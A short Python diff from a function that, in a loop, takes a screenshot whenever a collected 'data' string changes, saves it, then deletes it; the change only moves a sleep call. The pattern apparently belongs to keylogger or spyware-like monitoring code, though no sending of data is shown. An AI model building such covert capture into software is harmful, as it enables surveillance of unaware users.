@@ -52,9 +52,9 @@ def ss_bekle():
     temp=data
     while True:
         if len(temp)!=len(data):
-            sleep(count)
             ss=ImageGrab.grab()
             ss.save("Data\\ScreenShot.png","JPEG")#dosya ismi isteğe bağlı uzantısıyla hariç değiştirilebilir
+            sleep(count)
             temp=data
             data=""
             os.remove("Data\\ScreenShot.png")#dosya ismi isteğe bağlı uzantısıyla hariç değiştirilebilir
